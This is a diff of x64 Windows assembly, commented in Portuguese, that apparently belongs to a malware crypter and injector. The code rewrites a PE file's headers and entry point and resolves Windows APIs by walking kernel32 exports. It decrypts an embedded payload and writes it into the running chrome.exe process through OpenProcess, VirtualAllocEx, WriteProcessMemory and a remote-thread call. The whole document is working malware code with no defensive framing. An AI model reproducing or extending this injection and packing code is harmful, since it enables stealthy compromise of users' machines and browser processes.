@@ -46,7 +46,7 @@ WinMain:
         call Encrypt
         call CriaArquivoEncriptado 
         call PrepareInject
- 
+
         Encrypt:
                 xor rcx,rcx
                 xor rax,rax
@@ -131,6 +131,23 @@ WinMain:
                 call r12
                 add rsp, 0x30
                 add rsp, 0x18
+
+                call Locate_kernel32
+                call GetProcAddres
+                ;Lookup ExitProcess
+                mov rax, "ess"
+                push rax
+                mov rax, "ExitProc"
+                push rax
+                lea rdx, [rsp]
+                mov rcx, r8
+                sub rsp, 0x30
+                call r14
+                mov r12,rax
+                add rsp, 0x30
+
+                ;call ExitProcess
+                call r12
         ret
 
         codeModification:
@@ -152,6 +169,12 @@ WinMain:
                 add rsi, rdx
                 add rsi, 0x06
                 mov [rsi], word 0x02
+
+                ;Altera entry point
+                mov rsi, rdi
+                add rsi, rdx
+                add rsi, 0x28
+                mov [rsi],dword 0x156A 
         ret
 
 
@@ -209,7 +232,6 @@ WinMain:
                 mov [rsi], dword 0x40000040
         ret        
          
-
         IAT:
         ; Código para chegar na tabela de endereco de exportacao
         mov ebx, [rbx+0x3C];  # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
@@ -507,7 +529,12 @@ WinMain:
         ret
 
         PrepareInject:
+                push rbp
+                mov rbp, rsp
+                sub rsp, 0x160
+
                 call Locate_kernel32
+                call GetProcAddres
                 mov rdi,r8
                 ;Lookup VirtualAlloc
                 mov rax, "lloc"
@@ -524,19 +551,17 @@ WinMain:
                 ;call VirtualAlloc
                 mov r9d, 0x04
                 mov r8d, 0x1000
-                mov edx, [TamArqProgram]
+                mov edx, 0x20000
                 mov ecx, 0x00
                 sub rsp, 0x30
                 call r12
                 add rsp, 0x30
                 mov rbx,rax
-                add rsp, 0x10
-                mov [addressAlocado], rbx
                 
                 xor rcx,rcx
                 xor rdx,rdx
-                mov rsi, r13
-                        
+                mov rsi, 0x400000
+                add rsi, 0x2c00
                 LoopDecrypt:
                         mov rdx, [rsi]
                         sub dl, 0x95
@@ -546,14 +571,15 @@ WinMain:
                         add rsi, 0x01
                         add rax, 0x01
                         inc rcx
-                        cmp rcx, [TamArqTarget]
+                        cmp rcx, 0x2c00
                         jne LoopDecrypt
 
         get_process_pid:
                 push rbp
+                mov rbp, rsp
                 sub rsp, 0x160
                 lea rbp, [rsp+0x80]
-
+                 
                 ;Lookup CreateToolhelp32Snapshot
                 mov rax, "Snapshot"
                 push rax
@@ -569,10 +595,11 @@ WinMain:
                 call r14
                 mov r12,rax
                 add rsp, 0x30
-        
+                
                 ;call CreateToolhelp32Snapshot
                 mov edx, 0x00
                 mov ecx, 0x02
+                sub rsp, 0x30
                 call r12
                 mov [rbp+0xD8], rax
                 add rsp, 0x30
@@ -624,8 +651,10 @@ WinMain:
                 call r14
                 mov r13,rax
                 add rsp, 0x30
-
+                
+                mov rbp, rbx                
                 call Locate_ntdll
+                mov rbx,rbp
 
                 ;Lookup ZwClose
                 mov rax, "ZwClose"
@@ -636,7 +665,9 @@ WinMain:
                 call r14
                 mov r10,rax
                 add rsp, 0x30
-
+                
+                lea rbp, [rsp+0x80]
+                 
                 mov rax, "xe"
                 push rax
                 mov rax, "chrome.e"
@@ -657,14 +688,14 @@ WinMain:
                         jmp FimGetPid
                         FoundName:
                                 lea rdx, [rbp-0x60]
-                                mov rax, [rbp+0xD8]
+                                mov rax, [rbp+0x100]
                                 mov rcx,rax
                                 call r13
                                 test eax,eax
                                 setne al
                                 test al,al
                                 jne ProcessNext
-                                mov rax,[rbp-0xD8]
+                                mov rax,[rbp-0x100]
                                 mov rcx,rax
                                 call r13
 
@@ -672,10 +703,10 @@ WinMain:
                                 mov rbp,rax
                                 add rsp, 0x160
                                 add rsp, 0x10 
-
+                        mov rdi,rbx
                         call Locate_kernel32
                         call LoadLibrary
-
+                        mov rbx,rdi
                         loadKernelbase:
                                 ; Load kernelbase.dll
                                 mov rax, "se.dll"     
@@ -689,7 +720,7 @@ WinMain:
                                 add rsp, 0x30
                                 add rsp, 0x10
 
-                                OpenProcess:
+                        OpenProcess:
                                 ;Lookup OpenProcess
                                 mov rax, "ess"
                                 push rax
@@ -711,7 +742,7 @@ WinMain:
                                 mov rbp, rax
                                 add rsp, 0x30
                                 mov r13, rax
-                                mov [handle], rax
+                                
 
                         VirtualAllocEx:
                                 ;Lookup VirtualAllocEx
@@ -725,10 +756,11 @@ WinMain:
                                 call r14
                                 mov r12, rax
 
+                                mov r15, rbx
                                 ;call VirtualAllocEx
                                 xor rcx,rcx
                                 xor rbx,rbx
-                                mov rbx, [TamArqTarget]
+                                mov rbx, 0x20000
                                 mov r8d, ebx
                                 xor edx,edx
                                 mov rcx, r13
@@ -736,41 +768,19 @@ WinMain:
                                 mov r9d, 0x1000
                                 mov rbp, r13
                                 call r12
-                                mov r11,rax
-                                mov [addressAlocadoEx], rax
+                                mov rbx, r15
+                                mov rdi,rax
+                               
                                 
-                                push rbp
-                                mov rbp, rsp
-                                sub rsp, 0xA0
-                                
-                                ;Código lixo
-                                mov rax, [addressAlocadoEx]
-                                xor r15d,r15d
-                                xor r10,r10
-                                xor r14,r14
-                                xor rbx,rbx
-                                mov rbx, [addressAlocado]
-                                mov r14, rbx
-                                add r14, 0x3c
-                                xor rbx,rbx
-                                mov rbx, [r14]
-                                shl rbx, 0xB0
-                                shr rbx, 0xB0
-                                mov r14, [addressAlocado]
-                                add r14, rbx
-                                mov r10d, [r14+0xB0]
-                                
-                                mov rsi, [addressAlocado]
-                                add r10,rsi
-
-                                mov rdi, [addressAlocadoEx]
-                                mov rbx, [addressAlocado]
-                                sub rdi,rbx
-                                mov r11, [addressAlocadoEx]
-                        
+                        call Locate_kernel32 
+                        mov rbp,rbx
+                        mov rsi, r13      
                         call GetProcAddres
-                        
+                        mov rbx, r15
+                        mov r15, r9
+
                         call LoadLibrary
+                        mov r13, r15
                         ;Load kernelbase.dll
                         mov rax, "se.dll"     
                         push rax
@@ -799,16 +809,17 @@ WinMain:
                                 add rsp, 0x30
 
                                 ;call WriteProcessMemory
+
+                                mov r15, rbx
                                 xor rbx,rbx
-                               
-                                mov rbx, [TamArqTarget]
+                                mov rbx, 0x2c00
                                 mov r9d, ebx
                                 xor r10,r10
-                                mov r8, [addressAlocado]
-                                mov rdx, [addressAlocadoEx]
+                                mov r8,r15
+                                mov rdx,rdi
                                 xor r15,r15
                                 mov [rsp+0x20],r15
-                                mov rcx, [handle]
+                                mov rcx, r13
                                 call r12
                                 mov rbp, rax
                                 add rsp, 0x30     
@@ -833,14 +844,14 @@ WinMain:
                                 xor r15,r15
                                 mov [rsp+0x30], r15
                                 xor rbx,rbx
-                                mov rbx,[addressAlocadoEx]
+                                mov rbx,rdi
                                 mov r9, rbx
                                 mov dword [rsp+0x28],r15d
                                 mov [rsp+0x20], r15d
                                 xor rbx,rbx
                                 xor r8d,r8d
                                 xor edx,edx
-                                mov rcx, [handle]
+                                mov rcx, r13
                                 call r12
                         Exit:                             
                         ;lookup ExitProcess
